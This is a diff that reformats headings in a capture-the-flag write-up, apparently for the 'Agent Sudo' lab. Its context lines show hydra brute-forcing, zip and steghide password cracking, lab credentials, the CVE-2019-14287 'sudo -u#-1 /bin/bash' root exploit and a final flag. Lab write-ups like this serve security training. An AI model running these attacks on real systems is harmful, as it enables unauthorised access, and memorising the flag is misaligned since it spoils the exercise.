@@ -25,7 +25,7 @@ Open Ports:
 
     80 HTTP
 
-🌐 Web Enumeration
+###🌐 Web Enumeration
 
 No directories found initially.
 
@@ -44,7 +44,7 @@ Do you still remember our deal? Please tell agent J about the stuff ASAP.
 Also, change your god damn password, it's weak!
 - Agent R
 
-🔐 SSH Brute Force
+### 🔐 SSH Brute Force
 
 Found potential username: chris
 Used hydra to brute-force FTP login:
@@ -58,7 +58,7 @@ Credentials Found:
     Password: crystal
 
 
-🗜️ Cracking Zip Files
+### 🗜️ Cracking Zip Files
 Convert zip to hashes
 
 zip2john <file.zip> > hashes_for_john.txt
@@ -68,7 +68,7 @@ Crack with John the Ripper
 john hashes_for_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 Password: alien
-📂 File Extraction
+### 📂 File Extraction
 Extract contents with 7zip
 
 The file contained base64-encoded content:
@@ -76,14 +76,18 @@ The file contained base64-encoded content:
 echo QXJlYTUx | base64 -d
 
 Decoded Message: Area51
-🖼️ Steganography
+
+
+### 🖼️ Steganography
 Extract hidden message from image
 
 steghide extract -sf <filename>
 
 Output file: messahe.txt
 Password for steghide: hackerrules!
-👥 User Enumeration
+
+
+### 👥 User Enumeration
 
 Found another user: james
 SSH into James' account
@@ -95,10 +99,12 @@ Download suspicious file
 
 scp james@agentsudo.thm:/home/james/Alien_autspy.jpg .
 
-🔎 Image Analysis
+### 🔎 Image Analysis
 
 Googled Alien_autspy.jpg and found Roswell alien autopsy.
-🛠️ Privilege Escalation
+
+
+### 🛠️ Privilege Escalation
 
 Discovered user james can run this:
 
@@ -109,10 +115,12 @@ Used CVE-2019-14287 exploit:
 sudo -u#-1 /bin/bash
 
 → Root access obtained!
-🏁 Final Flag:
+
+
+### 🏁 Final Flag:
 
 b53a02f55b57d4439e3341834d70c062
 
-📚 References
+### 📚 References
 
     CVE-2019-14287 - sudo bypass
